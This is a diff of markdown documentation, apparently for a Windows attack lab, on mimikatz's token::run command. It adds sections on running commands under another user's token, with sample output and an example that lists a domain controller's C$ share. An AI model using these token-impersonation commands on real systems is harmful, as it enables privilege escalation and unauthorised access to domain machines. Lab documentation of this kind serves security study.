@@ -41,7 +41,25 @@ SID name  :
 winattacklab\ffast
 ```
 
-Access DC system drive:
+## user
+
+Run a command using a specified token by it's username. The domain name must not be specified. By default, the command `whoami` is executed:
+
+```
+mimikatz # token::run /user:ffast
+Token Id  : 457263
+User name :
+SID name  :
+
+676     {0;000f0ac5} 3 F 457263         winattacklab\ffast     S-1-5-21-1345929560-157546789-2569868433-1123   (15g,24p)       Primary
+winattacklab\ffast
+```
+
+## process
+
+Other processes to spawn can be specified.
+
+Example to access DC system drive:
 
 ```
 mimikatz # token::run /id:1075487 /process:"cmd.exe /c dir \\dc1\c$"
